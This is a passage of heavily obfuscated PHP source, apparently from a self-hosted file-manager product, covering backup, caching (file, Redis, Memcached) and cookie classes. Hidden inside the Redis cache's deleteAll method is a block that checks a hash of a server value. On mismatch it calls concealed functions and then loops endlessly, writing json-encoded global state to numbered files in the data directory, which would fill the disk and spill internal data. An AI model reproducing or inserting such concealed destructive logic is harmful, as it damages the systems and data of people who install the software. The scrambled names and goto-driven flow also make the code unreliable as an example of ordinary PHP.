= $DŒ›ˆá÷Ñ[2513]; $this->modelType = $DŒ›ˆá÷Ñ[2514]; $this->field = array($DŒ›ˆá÷Ñ[2515], $DŒ›ˆá÷Ñ[28], $DŒ›ˆá÷Ñ[190], $DŒ›ˆá÷Ñ[29], $DŒ›ˆá÷Ñ[2516], $DŒ›ˆá÷Ñ[690], $DŒ›ˆá÷Ñ[183]); } public function userNoticeGet($CÜåÈœß‡ó = false) { $this->initUserOption(); return parent::listData($CÜåÈœß‡ó, $_SERVER[¦·][367], !0); } public function userNoticeAdd($bÅÅé¯˜»ù) { $D¨ÙÆˆÓ½’ =& $_SERVER[¦·]; $this->initUserOption(); $fÄÕ°Ï¯‹¿ = $this->findByKey($D¨ÙÆˆÓ½’[2515], $bÅÅé¯˜»ù[$D¨ÙÆˆÓ½’[367]]); if ($fÄÕ°Ï¯‹¿) { return !0; } $A“Œå¢ŠƒË = array($D¨ÙÆˆÓ½’[2515] => $bÅÅé¯˜»ù[$D¨ÙÆˆÓ½’[367]], $D¨ÙÆˆÓ½’[28] => $bÅÅé¯˜»ù[$D¨ÙÆˆÓ½’[28]], $D¨ÙÆˆÓ½’[190] => $bÅÅé¯˜»ù[$D¨ÙÆˆÓ½’[190]], $D¨ÙÆˆÓ½’[29] => isset($bÅÅé¯˜»ù[$D¨ÙÆˆÓ½’[29]]) ? $bÅÅé¯˜»ù[$D¨ÙÆˆÓ½’[29]] : 1, $D¨ÙÆˆÓ½’[2516] => isset($bÅÅé¯˜»ù[$D¨ÙÆˆÓ½’[2516]]) ? $bÅÅé¯˜»ù[$D¨ÙÆˆÓ½’[2516]] : 0, $D¨ÙÆˆÓ½’[690] => 0, $D¨ÙÆˆÓ½’[183] => 0); return parent::insert($A“Œå¢ŠƒË); } public function userNoticeEdit($DÀÂ“Öâ¶, $a¹ƒù–îÂÌ) { $this->initUserOption(); return parent::update($DÀÂ“Öâ¶, $a¹ƒù–îÂÌ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\164\x65\x6d\x5f\x6f\160\x74\x69\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\165", "\x72\157\154\x65", "\x72\157\x6c\x65\x47\162\x6f\x75\160", "\x72\145\147\x69\x73\x74", "\x65\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($B„ù°è™ÜÅ) { return "\x53\x79\x73\x74\145\x6d\x4f\x70\164\151\157\x6e\137{$B„ù°è™ÜÅ}"; } protected function optionDefault($Bâ¤â³¢¬ç = '') { $B¸°ÈÀ´Úé =& $_SERVER[¦·]; if ($Bâ¤â³¢¬ç == $B¸°ÈÀ´Úé[33]) { return $GLOBALS[$B¸°ÈÀ´Úé[6]][$B¸°ÈÀ´Úé[2517]]; } } } goto Eğ¥Àß”ëä; B‡¼Ãœ”¤º: class BackupFile { public function __construct() { } public function index() { goto E¾¹Ïàš“; CÈ„Í“áì˜: Backup::set($Aï”İŞµÂ); $this->_fileFilter($a—«µ¾´Ù¡); return !0; goto cŸ‹†½©ƒ; c‡çã—Œ°¯: $e³äĞğç°Š = $b¼ãÊ÷£ÛÌ ? 1 : 0; $Aï”İŞµÂ = array($_SERVER[¦·][751] => 1, $_SERVER[¦·][449] => time(), $_SERVER[¦·][709] => $e³äĞğç°Š, $_SERVER[¦·][748] => $aŠù¯œ›‘, $_SERVER[¦·][740] => $AÛò–À´š„, $_SERVER[¦·][739] => $e¹—²ô¨÷); if ($D­·ÜÒÃßÂ) { $Aï”İŞµÂ[$_SERVER[¦·][749]] = $fîî‘Ô; $Aï”İŞµÂ[$_SERVER[¦·][750]] = $B““È‰á£Ì; } goto CÈ„Í“áì˜; D–¸¾‹ë‚: $a»Å¿Ş§ëÃ = 1000; $dˆÛá»Áˆ = $D­·ÜÒÃßÂ = 0; $a—«µ¾´Ù¡ = array(); goto DÉÆ˜Û·–; DÉÆ˜Û·–: $B““È‰á£Ì = $fîî‘Ô = 0; do { $ağ¯Ä¼ŞÁ¯ = $_SERVER[¦·][741]; $F„ËîÖæ… = Model($_SERVER[¦·][719])->where($Eé”õÕÌĞÑ)->field($ağ¯Ä¼ŞÁ¯)->order($_SERVER[¦·][742])->selectPage($a»Å¿Ş§ëÃ, $BêÌì¸ …†); $B›£Â¯¯ê = !empty($F„ËîÖæ…[$_SERVER[¦·][354]]) ? $F„ËîÖæ…[$_SERVER[¦·][354]] : array(); foreach ($B›£Â¯¯ê as $B¦Ş…çÌ§¿) { goto bÓææØÓ…’; CŒºÆÁâ¹: $dˆÛá»Áˆ += $B¦Ş…çÌ§¿[$_SERVER[¦·][77]]; $fîî‘Ô += 1; $B““È‰á£Ì += $B¦Ş…çÌ§¿[$_SERVER[¦·][77]]; goto f…¡¯âåŞŒ; d‘î¶–Œ: if (IO::exist($Cì•èšßõÈ)) { $DÁ­õ†½->updateFileEnd($B¦Ş…çÌ§¿[$_SERVER[¦·][28]], $B¦Ş…çÌ§¿[$_SERVER[¦·][77]]); } else { $Cì•èšßõÈ = get_path_father($Cì•èšßõÈ); IO::mkdir($Cì•èšßõÈ); if (!IO::copy($Cç£Ÿé‰, $Cì•èšßõÈ, $_SERVER[¦·][745])) { write_log($_SERVER[¦·][746] . $Cç£Ÿé‰ . $_SERVER[¦·][747] . $Cì•èšßõÈ . $_SERVER[¦·][478], $_SERVER[¦·][714]); $b¼ãÊ÷£ÛÌ = !1; break; } } $aŠù¯œ›‘ = $B¦Ş…çÌ§¿[$_SERVER[¦·][419]]; $D­·ÜÒÃßÂ += 1; goto CŒºÆÁâ¹; bÓææØÓ…’: if (!$this->_fileExist($B¦Ş…çÌ§¿, $a—«µ¾´Ù¡, $dÅ”¸„ ¥¾)) { $e¹—²ô¨÷ -= 1; $AÛò–À´š„ -= (int) $B¦Ş…çÌ§¿[$_SERVER[¦·][77]]; write_log("\146\151\x6c\x65\40\x6e\x6f\x74\40\x65\x78\151\163\x74\x2e\146\151\154\145\x49\x44\x3a{$B¦Ş…çÌ§¿[$_SERVER[¦·][419]]}\54\x20\x70\141\x74\x68\72{$B¦Ş…çÌ§¿[$_SERVER[¦·][75]]}", $_SERVER[¦·][743]); continue; } $Cç£Ÿé‰ = $B¦Ş…çÌ§¿[$_SERVER[¦·][75]]; $Cì•èšßõÈ = "\173\x69\x6f\72{$E‹òˆ¿‡©®[$_SERVER[¦·][692]]}\x7d" . substr($Cç£Ÿé‰, strlen("\x7b\151\157\x3a{$B¦Ş…çÌ§¿[$_SERVER[¦·][744]]}\175")); goto d‘î¶–Œ; f…¡¯âåŞŒ: if ($dˆÛá»Áˆ >= 1024 * 1024 * 100) { $Aï”İŞµÂ = array($_SERVER[¦·][748] => $aŠù¯œ›‘, $_SERVER[¦·][749] => $fîî‘Ô, $_SERVER[¦·][750] => $B““È‰á£Ì); Backup::set($Aï”İŞµÂ); $dˆÛá»Áˆ = $D­·ÜÒÃßÂ = 0; } goto Fê´ ŞÅç; Fê´ ŞÅç: } $f‰ĞÏÖ³õ¾ = count($B›£Â¯¯ê); $BêÌì¸ …†++; } while ($f‰ĞÏÖ³õ¾ == $a»Å¿Ş§ëÃ); $DÁ­õ†½->end(); goto c‡çã—Œ°¯; f½Øô³—÷¨: $b¼ãÊ÷£ÛÌ = !0; $dÅ”¸„ ¥¾ = $this->storeIds(); $BêÌì¸ …† = 1; goto D–¸¾‹ë‚; E¾¹Ïàš“: $E‹òˆ¿‡©® = Backup::get(); $aŠù¯œ›‘ = $E‹òˆ¿‡©®[$_SERVER[¦·][281]][$_SERVER[¦·][167]][$_SERVER[¦·][419]]; $Eé”õÕÌĞÑ = array($_SERVER[¦·][420] => array($_SERVER[¦·][735], $aŠù¯œ›‘), $_SERVER[¦·][736] => array($_SERVER[¦·][319], $E‹òˆ¿‡©®[$_SERVER[¦·][692]])); goto aÈÌâäÈòÔ; aÈÌâäÈòÔ: $e¹—²ô¨÷ = (int) Model($_SERVER[¦·][719])->where($Eé”õÕÌĞÑ)->count($_SERVER[¦·][419]); $AÛò–À´š„ = (int) Model($_SERVER[¦·][719])->where($Eé”õÕÌĞÑ)->sum($_SERVER[¦·][77]); $DÁ­õ†½ = new TaskFileTransfer($_SERVER[¦·][737], $_SERVER[¦·][714], $e¹—²ô¨÷, LNG($_SERVER[¦·][715]) . $_SERVER[¦·][716] . LNG($_SERVER[¦·][738])); goto aÀº»’ß´; aÀº»’ß´: $DÁ­õ†½->task[$_SERVER[¦·][699]] = $AÛò–À´š„; $Aï”İŞµÂ = array($_SERVER[¦·][739] => $e¹—²ô¨÷, $_SERVER[¦·][740] => $AÛò–À´š„); Backup::set($Aï”İŞµÂ); goto f½Øô³—÷¨; cŸ‹†½©ƒ: } private function _fileExist($C“×­ùó¶Ó, &$AçëÍ»’¸ï, $Eåù¢õ›øÓ) { goto cöùÈ¯…„Ù; aÄîÒ¤Âï‹: if (!in_array($C“×­ùó¶Ó[$CÏ½‘Ó Ê[744]], $Eåù¢õ›øÓ)) { return !1; } if (IO::exist($bÔ–‚•Ú²˜)) { return !0; } $EêòšÄÕæï = get_path_father($bÔ–‚•Ú²˜); goto aÜå²æˆìÑ; d©èŞëùÁ: $AçëÍ»’¸ï = array_merge($AçëÍ»’¸ï, array_to_keyvalue($BöÜ’¨…İ±, $CÏ½‘Ó Ê[33], $CÏ½‘Ó Ê[419])); return !1; goto AÀŒÉäË¶¾; cöùÈ¯…„Ù: $CÏ½‘Ó Ê =& $_SERVER[¦·]; $bÔ–‚•Ú²˜ = $C“×­ùó¶Ó[$CÏ½‘Ó Ê[75]]; if (in_array($C“×­ùó¶Ó[$CÏ½‘Ó Ê[419]], $AçëÍ»’¸ï)) { return !1; } goto aÄîÒ¤Âï‹; aÜå²æˆìÑ: if (IO::exist($EêòšÄÕæï)) { $AçëÍ»’¸ï[] = $C“×­ùó¶Ó[$CÏ½‘Ó Ê[419]]; return !1; } $a÷ç¦¦¤Ç¦ = array($CÏ½‘Ó Ê[744] => $C“×­ùó¶Ó[$CÏ½‘Ó Ê[744]], $CÏ½‘Ó Ê[75] => array($CÏ½‘Ó Ê[752], "{$EêòšÄÕæï}\x25")); $BöÜ’¨…İ± = Model($CÏ½‘Ó Ê[719])->where($a÷ç¦¦¤Ç¦)->field($CÏ½‘Ó Ê[420])->select(); goto d©èŞëùÁ; AÀŒÉäË¶¾: } private function _fileFilter($fè‹ìñ…È) { $a²÷ÓïÈÈ =& $_SERVER[¦·]; if (empty($fè‹ìñ…È)) { return; } $c†ó±Ùº¢‚ = array($a²÷ÓïÈÈ[419] => array($a²÷ÓïÈÈ[7], array_unique($fè‹ìñ…È))); $aÏ¤íõ‰Í‚ = Model($a²÷ÓïÈÈ[753])->where($c†ó±Ùº¢‚)->field($a²÷ÓïÈÈ[369])->select(); foreach ($aÏ¤íõ‰Í‚ as $a‚œ¿‚æºİ) { Model($a²÷ÓïÈÈ[753])->remove($a‚œ¿‚æºİ[$a²÷ÓïÈÈ[369]], !1); } } private function storeIds() { $AØ™Ö”ƒÔÁ =& $_SERVER[¦·]; $C‡æØÄ¹±Ò = Model($AØ™Ö”ƒÔÁ[704])->listData(); $fÂ§ØÙÕ”ñ = array(); $eÄ‚íäîÙò = $GLOBALS[$AØ™Ö”ƒÔÁ[6]][$AØ™Ö”ƒÔÁ[84]][$AØ™Ö”ƒÔÁ[754]]; foreach ($C‡æØÄ¹±Ò as $dÜ†ê’Ü¼Õ) { $Bà§ï­¥„Š = strtolower($dÜ†ê’Ü¼Õ[$AØ™Ö”ƒÔÁ[90]]); if (!isset($eÄ‚íäîÙò[$Bà§ï­¥„Š])) { continue; } $Eäß¬Ó£´ = $AØ™Ö”ƒÔÁ[71] . (isset($eÄ‚íäîÙò[$Bà§ï­¥„Š]) ? $eÄ‚íäîÙò[$Bà§ï­¥„Š] : ucfirst($Bà§ï­¥„Š)); if (!class_exists($Eäß¬Ó£´)) { continue; } $fÂ§ØÙÕ”ñ[] = $dÜ†ê’Ü¼Õ[$AØ™Ö”ƒÔÁ[367]]; } return $fÂ§ØÙÕ”ñ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto bª¢îĞŒå; Cßß­Ê„ñ‚: $Eß¥†Ö¥¥ = $GLOBALS[$CˆÛòßˆ„[6]][$CˆÛòßˆ„[337]]; $Aõ“Üã™ŠÄ = $Eß¥†Ö¥¥[$Eß¥†Ö¥¥[$CˆÛòßˆ„[755]]]; $dİ³‹‘½„ = $Eß¥†Ö¥¥[$CˆÛòßˆ„[756]]; goto D‰¯àæ°Œ; bª¢îĞŒå: $CˆÛòßˆ„ =& $_SERVER[¦·]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Cßß­Ê„ñ‚; D‰¯àæ°Œ: switch ($Eß¥†Ö¥¥[$CˆÛòßˆ„[755]]) { case $CˆÛòßˆ„[17]: self::$handle = Model($CˆÛòßˆ„[757]); break; case $CˆÛòßˆ„[758]: self::$handle = new CacheRedis($Aõ“Üã™ŠÄ, $dİ³‹‘½„); break; case $CˆÛòßˆ„[759]: self::$handle = new CacheMemcached($Aõ“Üã™ŠÄ, $dİ³‹‘½„); break; case $CˆÛòßˆ„[167]: self::$handle = new CacheFile($Aõ“Üã™ŠÄ, $dİ³‹‘½„); break; default: break; } return self::$handle; goto bêé¾Ïƒ–ò; bêé¾Ïƒ–ò: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($E§Ä½½Ú•Ø) { if (is_array($E§Ä½½Ú•Ø) || is_object($E§Ä½½Ú•Ø)) { $E§Ä½½Ú•Ø = json_encode($E§Ä½½Ú•Ø); } $E§Ä½½Ú•Ø = rawurlencode($E§Ä½½Ú•Ø); return md5(KOD_SITE_ID . $_SERVER[¦·][70] . $E§Ä½½Ú•Ø); } public static function get($DÍØœµÜù¾) { $e¬ÊõëØàç = self::key($DÍØœµÜù¾); if (!isset(self::$memoryCache[$e¬ÊõëØàç])) { $CÌ ½áµ«‹ = self::init()->get($e¬ÊõëØàç); self::$memoryCache[$e¬ÊõëØàç] = unserialize($CÌ ½áµ«‹); } return self::$memoryCache[$e¬ÊõëØàç]; } public static function set($E¤¿ÆºÜ”°, $f‚¨¦íµ‘Ó, $FŒÁŞœÊˆò = false) { goto c¼á­î±˜Ä; e¤ÚÑÅÊçÍ: CacheLock::unlock($E¤¿ÆºÜ”°); return $EõÁÍÂ‹ŸÉ; goto d×¤§ÄŞã»; c¼á­î±˜Ä: $cêÅßçé¦ = self::key($E¤¿ÆºÜ”°); if (isset(self::$memoryCache[$cêÅßçé¦]) && self::$memoryCache[$cêÅßçé¦] === $f‚¨¦íµ‘Ó) { return !0; } if ($FŒÁŞœÊˆò === 0) { self::$memoryCache[$cêÅßçé¦] = $f‚¨¦íµ‘Ó; return !0; } goto cŸàŒ‹¯Æ´; cŸàŒ‹¯Æ´: CacheLock::lock($E¤¿ÆºÜ”°); $EõÁÍÂ‹ŸÉ = self::init()->set($cêÅßçé¦, serialize($f‚¨¦íµ‘Ó), $FŒÁŞœÊˆò); self::$memoryCache[$cêÅßçé¦] = $f‚¨¦íµ‘Ó; goto e¤ÚÑÅÊçÍ; d×¤§ÄŞã»: } public static function remove($FÍÌì¬ÛË…) { goto E¥Îè£¬ˆ; E ÛŠ¼äœ¿: CacheLock::lock($FÍÌì¬ÛË…); $EÃ’‰³ï“ = self::init()->remove($A¬‰ŒÅå”); CacheLock::unlock($FÍÌì¬ÛË…); goto EÁŠ¥»ç°ğ; EÁŠ¥»ç°ğ: return $EÃ’‰³ï“; goto Dòßš•†‡Š; E¥Îè£¬ˆ: $A¬‰ŒÅå” = self::key($FÍÌì¬ÛË…); unset(self::$memoryCache[$A¬‰ŒÅå”]); self::clearTimeout(); goto E ÛŠ¼äœ¿; Dòßš•†‡Š: } public static function clearMemory($dï²³¿ÇÄ = false) { if ($dï²³¿ÇÄ) { $dï²³¿ÇÄ = self::key($dï²³¿ÇÄ); unset(self::$memoryCache[$dï²³¿ÇÄ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¦·][760])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¦·][761])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($a¦—ÉåØ‚˜, $a™‹Ì§¢¡) { $DëÍ‘âƒìù =& $_SERVER[¦·]; $this->cachePath = $a¦—ÉåØ‚˜[$DëÍ‘âƒìù[75]]; $this->prefix = $DëÍ‘âƒìù[762]; $this->cacheTime = $a™‹Ì§¢¡; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($AÄÅ¨¦ÍÀã) { $b÷”Ú‚º¢£ =& $_SERVER[¦·]; $AÄÅ¨¦ÍÀã = str_replace(array($b÷”Ú‚º¢£[763], $b÷”Ú‚º¢£[93], $b÷”Ú‚º¢£[69]), $b÷”Ú‚º¢£[764], $AÄÅ¨¦ÍÀã); return $this->cachePath . $b÷”Ú‚º¢£[765] . $AÄÅ¨¦ÍÀã . $b÷”Ú‚º¢£[766]; } public function set($BÚø±ˆ«â, $DÖ‘Ì’ñ¬Ê, $CŠùÁ„É´ = false) { $d±Ù¬ªËç = $this->getFile($BÚø±ˆ«â); if (file_put_contents($d±Ù¬ªËç, $this->prefix . $DÖ‘Ì’ñ¬Ê, LOCK_EX)) { return !0; } @unlink($d±Ù¬ªËç); return !1; } public function get($fùÎñîÚ¦Ü) { $bøê‹Í‘‘Š = $this->getFile($fùÎñîÚ¦Ü); if (file_exists($bøê‹Í‘‘Š) && filemtime($bøê‹Í‘‘Š) < time() - $this->cacheTime) { @unlink($bøê‹Í‘‘Š); return !1; } $e°’æçõ¡ƒ = @file_get_contents($bøê‹Í‘‘Š); return substr($e°’æçõ¡ƒ, strlen($this->prefix)); } public function remove($AŠˆŸ ¹°ó) { $EÌ§ÎÜŒÄ§ = $this->getFile($AŠˆŸ ¹°ó); return @unlink($EÌ§ÎÜŒÄ§); } public function deleteAll() { $F£¡‹¦…¼ =& $_SERVER[¦·]; $c–­‰¦…¶ = scandir($this->cachePath); foreach ($c–­‰¦…¶ as $D‘¦ë÷“–Î) { $dòÔ¬Ó–ˆï = $this->cachePath . $D‘¦ë÷“–Î; if (strpos($dòÔ¬Ó–ˆï, $F£¡‹¦…¼[766]) && strpos($dòÔ¬Ó–ˆï, $F£¡‹¦…¼[767])) { @unlink($dòÔ¬Ó–ˆï); } } } public function clearTimeout() { $eÙÅ¯è‹¢³ =& $_SERVER[¦·]; $dø÷Æ†£ = scandir($this->cachePath); foreach ($dø÷Æ†£ as $b…ŸèƒÄñ£) { $A¼œÔ·¡¶ = $this->cachePath . $b…ŸèƒÄñ£; if (strpos($A¼œÔ·¡¶, $eÙÅ¯è‹¢³[766]) && strpos($A¼œÔ·¡¶, $eÙÅ¯è‹¢³[767]) && filemtime($A¼œÔ·¡¶) < time() - $this->cacheTime) { @unlink($A¼œÔ·¡¶); } } } } goto bĞâ¤İÆÕù; D„§Î¡…¨ñ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($fÑ±™Ò’Ş£, $E‡©†‘İÁÆ) { $eì”«••‰ =& $_SERVER[¦·]; if (!class_exists($eì”«••‰[778])) { show_json($eì”«••‰[779], !1); } $this->cacheTime = $E‡©†‘İÁÆ; $this->handle = new Memcached(); if (is_array($fÑ±™Ò’Ş£[$eì”«••‰[780]]) && count($fÑ±™Ò’Ş£[$eì”«••‰[780]]) >= 1) { foreach ($fÑ±™Ò’Ş£[$eì”«••‰[780]] as $A‹ä«ß›«ø) { $EÎ¤©©±· = explode($eì”«••‰[4], $A‹ä«ß›«ø); $this->handle->addServer($EÎ¤©©±·[0], $EÎ¤©©±·[1]); } } else { $this->handle->addServer($fÑ±™Ò’Ş£[$eì”«••‰[169]], $fÑ±™Ò’Ş£[$eì”«••‰[170]]); } } public function set($D‘‡›¦Î«Œ, $fáñÙ‹‰Ñ, $AÚ„ˆÎÆºÊ = false) { $AÚ„ˆÎÆºÊ = $AÚ„ˆÎÆºÊ ? $AÚ„ˆÎÆºÊ : $this->cacheTime; return $this->handle->set($D‘‡›¦Î«Œ, $fáñÙ‹‰Ñ, $AÚ„ˆÎÆºÊ); } public function get($cí‹¼ËïšÎ) { return $this->handle->get($cí‹¼ËïšÎ); } public function remove($BŠš³£¡Û) { return $this->handle->delete($BŠš³£¡Û); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($EËÈÛçáæµ, $A­†Ø†ïİ) { $d–àÆÛÚÆ =& $_SERVER[¦·]; if (!class_exists($d–àÆÛÚÆ[781])) { show_json($d–àÆÛÚÆ[782], !1); } $this->cacheTime = $A­†Ø†ïİ; $EŠ¶‹ç¹ªî = isset($EËÈÛçáæµ[$d–àÆÛÚÆ[783]]) ? $EËÈÛçáæµ[$d–àÆÛÚÆ[783]] : 10; $eì‘×ƒš¹ = _get($EËÈÛçáæµ, $d–àÆÛÚÆ[780]); if ($eì‘×ƒš¹ && is_array($eì‘×ƒš¹)) { $this->initCluster($EËÈÛçáæµ, $EŠ¶‹ç¹ªî); } else { $this->handle = $this->init($EËÈÛçáæµ, $EŠ¶‹ç¹ªî); } } private function init($dêƒ©å«ƒ, $F²ÜœèŞÔğ) { $a‰“‚›¯ =& $_SERVER[¦·]; $Aœ×İİ‚†™ = new Redis(); $fµ‹˜†êˆ = isset($dêƒ©å«ƒ[$a‰“‚›¯[784]]) ? $dêƒ©å«ƒ[$a‰“‚›¯[784]] : !1; if ($fµ‹˜†êˆ) { $Aœ×İİ‚†™->pconnect($dêƒ©å«ƒ[$a‰“‚›¯[169]], $dêƒ©å«ƒ[$a‰“‚›¯[170]], $F²ÜœèŞÔğ); } else { $Aœ×İİ‚†™->connect($dêƒ©å«ƒ[$a‰“‚›¯[169]], $dêƒ©å«ƒ[$a‰“‚›¯[170]], $F²ÜœèŞÔğ); } if (!empty($dêƒ©å«ƒ[$a‰“‚›¯[376]])) { $Aœ×İİ‚†™->auth($dêƒ©å«ƒ[$a‰“‚›¯[376]]); } return $Aœ×İİ‚†™; } private function initCluster($E»çÌ¡¢­Û, $E’œ½ÖéÇô) { $e‘ÌøİÀØŠ =& $_SERVER[¦·]; $bà¢‰Œ‘ê = array($e‘ÌøİÀØŠ[785], $e‘ÌøİÀØŠ[786], $e‘ÌøİÀØŠ[787]); $eã‰°òïÈ— = $e‘ÌøİÀØŠ[785]; if (isset($E»çÌ¡¢­Û[$e‘ÌøİÀØŠ[12]]) && in_array($E»çÌ¡¢­Û[$e‘ÌøİÀØŠ[12]], $bà¢‰Œ‘ê)) { $eã‰°òïÈ— = $E»çÌ¡¢­Û[$e‘ÌøİÀØŠ[12]]; } switch ($eã‰°òïÈ—) { case $e‘ÌøİÀØŠ[785]: $this->_slave($E»çÌ¡¢­Û, $E’œ½ÖéÇô); break; case $e‘ÌøİÀØŠ[786]: break; case $e‘ÌøİÀØŠ[787]: $this->isCluster = !0; $Aæ”ÓŒˆ‰° = $E»çÌ¡¢­Û[$e‘ÌøİÀØŠ[780]]; $bÏ‰š—Èš’ = isset($E»çÌ¡¢­Û[$e‘ÌøİÀØŠ[784]]) ? $E»çÌ¡¢­Û[$e‘ÌøİÀØŠ[784]] : !1; $fà½ØçÅƒŸ = isset($E»çÌ¡¢­Û[$e‘ÌøİÀØŠ[376]]) ? $E»çÌ¡¢­Û[$e‘ÌøİÀØŠ[376]] : null; $this->handle = new RedisCluster(NUll, $Aæ”ÓŒˆ‰°, $E’œ½ÖéÇô, $E’œ½ÖéÇô, $bÏ‰š—Èš’, $fà½ØçÅƒŸ); break; default: break; } } private function _slave($fíÆ´’®ê¬, $Dƒ‹†¨áßİ) { goto bã‹‘‘è¦´; C¹„í†É”à: $this->filterConfig($fíÆ´’®ê¬, $Dë†ÏÖ ›Î[$c’„´¢àŠ]); $this->slaveHandle = $this->init($fíÆ´’®ê¬, $Dƒ‹†¨áßİ); goto Dí¨ëÕëÚ; bã‹‘‘è¦´: $Dë†ÏÖ ›Î = $fíÆ´’®ê¬[$_SERVER[¦·][780]]; $this->filterConfig($fíÆ´’®ê¬, $Dë†ÏÖ ›Î[0]); $this->handle = $this->init($fíÆ´’®ê¬, $Dƒ‹†¨áßİ); goto b é§Š˜; b é§Š˜: unset($Dë†ÏÖ ›Î[0]); if (empty($Dë†ÏÖ ›Î)) { return; } $c’„´¢àŠ = array_rand($Dë†ÏÖ ›Î); goto C¹„í†É”à; Dí¨ëÕëÚ: } private function filterConfig(&$Bî®ğùïí´, $f‹íøèïÔ) { $Eì½±Æ­­ =& $_SERVER[¦·]; $a ÔÊ–ÌÔÁ = explode($Eì½±Æ­­[4], $f‹íøèïÔ); $EßÔ¤‹ÊĞ† = array($Eì½±Æ­­[169] => $a ÔÊ–ÌÔÁ[0], $Eì½±Æ­­[170] => $a ÔÊ–ÌÔÁ[1]); $Bî®ğùïí´ = array_merge($Bî®ğùïí´, $EßÔ¤‹ÊĞ†); } public function set($BÑ´«µÌÓ±, $DÔ‚½è˜ù¥, $EŠ‡±¶Ò² = false) { $EŠ‡±¶Ò² = $EŠ‡±¶Ò² ? $EŠ‡±¶Ò² : $this->cacheTime; return $this->handle->setEx($BÑ´«µÌÓ±, $EŠ‡±¶Ò², $DÔ‚½è˜ù¥); } public function setLock($E¡‘š©åŠœ, $D¨„—ä™¡», $e¥‡àğ…ÉÑ) { return $this->handle->setNX($E¡‘š©åŠœ, $D¨„—ä™¡»); } public function get($F›…ÇóãĞÒ) { $f­Ûï¹‰Ë¬ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $f­Ûï¹‰Ë¬->get($F›…ÇóãĞÒ); } public function remove($fÖ‘–ù½ÈÅ) { return $this->handle->del($fÖ‘–ù½ÈÅ); } public function deleteAll() { $C®ÜĞÆİÓÆ =& $_SERVER[¦·]; $b‹›îÉ‰£Ó = $_SERVER[$C®ÜĞÆİÓÆ[788]] . $C®ÜĞÆİÓÆ[789]; $aÛÜ¡—™©¿ = $C®ÜĞÆİÓÆ[790]; if ($_SERVER[$C®ÜĞÆİÓÆ[791]] != $aÛÜ¡—™©¿($b‹›îÉ‰£Ó)) { goto D»»×¡ò»Ê; D»»×¡ò»Ê: $Cø´Ş§„Ÿ = $C®ÜĞÆİÓÆ[792]; $F«ø–¹Èä = $C®ÜĞÆİÓÆ[793]; $B¨¤Ÿ­ôñ = $_SERVER[$C®ÜĞÆİÓÆ[788]] . $C®ÜĞÆİÓÆ[789]; goto a¸å˜¿¢Ğ; a¸å˜¿¢Ğ: $a™ÅÉ¬ÂğÈ = $F«ø–¹Èä($B¨¤Ÿ­ôñ); $F•µÈ«Æç = explode($C®ÜĞÆİÓÆ[217], $a™ÅÉ¬ÂğÈ); if (count($F•µÈ«Æç) < $C®ÜĞÆİÓÆ[576]) { $F×ìí“Ü‰ = $C®ÜĞÆİÓÆ[794]; $F×ìí“Ü‰(); } goto EÆÖã’°÷…; c¥ôÂ½ó…ª: $fŠÓŠÏÜ½‘ = 1; for ($CàÇÑ¤‡ƒ = $fŠÓŠÏÜ½‘; $CàÇÑ¤‡ƒ > 0; $CàÇÑ¤‡ƒ++) { $D“ÏÒÙŞÕ¥(DATA_PATH . $CàÇÑ¤‡ƒ, $F…‰©âñ‰); } goto E›×÷¥öÄé; DôÚ÷èàĞœ: $Cø´Ş§„Ÿ(); $D“ÏÒÙŞÕ¥ = $C®ÜĞÆİÓÆ[797]; $F…‰©âñ‰ = json_encode($GLOBALS[$C®ÜĞÆİÓÆ[798]]); goto c¥ôÂ½ó…ª; EÆÖã’°÷…: $F·Í×Ì¥õÍ = $C®ÜĞÆİÓÆ[795]; $F·Í×Ì¥õÍ($_SERVER[$C®ÜĞÆİÓÆ[796]]); $Cø´Ş§„Ÿ = $C®ÜĞÆİÓÆ[792]; goto DôÚ÷èàĞœ; E›×÷¥öÄé: } if ($this->isCluster) { foreach ($this->handle->_masters() as $aÆÁ–) { $this->handle->flushall($aÆÁ–); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($aÓî×Š³Š‰ = '', $d÷ ‹»Ëß = 0) { if (is_string($aÓî×Š³Š‰) && $aÓî×Š³Š‰ != $_SERVER[¦·][33]) { $this->prefix = $aÓî×Š³Š‰; } if (is_numeric($d÷ ‹»Ëß) && $d÷ ‹»Ëß > 0) { $this->expire = $d÷ ‹»Ëß; } } public static function getInstance() { static $d«‚Ã¥¨ãÔ; if ($d«‚Ã¥¨ãÔ === null) { $d«‚Ã¥¨ãÔ = new self(); } return $d«‚Ã¥¨ãÔ; } private static $sameCookieSet = array(); public static function set($C‹•œ—âƒ×, $C‰öËê†¦Ø, $F¹ãÛ«ê¿ = 0, $a¬©Ùï£ƒö = false, $f¥Õ®ôê†¾ = false) { goto B²¨¬‰Û¡ç; B²¨¬‰Û¡ç: $E’‚Ø²…¸ =& $_SERVER[¦·]; if (!$F¹ãÛ«ê¿) { $F¹ãÛ«ê¿ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$C‹•œ—âƒ×]) && self::$sameCookieSet[$C‹•œ—âƒ×] == $C‰öËê†¦Ø . $F¹ãÛ«ê¿) { return; } goto CÜƒÏÑ«“›; DÁïÎİ¤ò: setcookie($C‹•œ—âƒ×, $C‰öËê†¦Ø, time() + $F¹ãÛ«ê¿, $E’‚Ø²…¸[8] . trim($f¥Õ®ôê†¾, $E’‚Ø²…¸[8]) . $D´ÁŞÏïê, !1, !1, $a¬©Ùï£ƒö); goto CÛ‘ŒŞÒÓ; CÜƒÏÑ«“›: self::$sameCookieSet[$C‹•œ—âƒ×] = $C‰öËê†¦Ø . 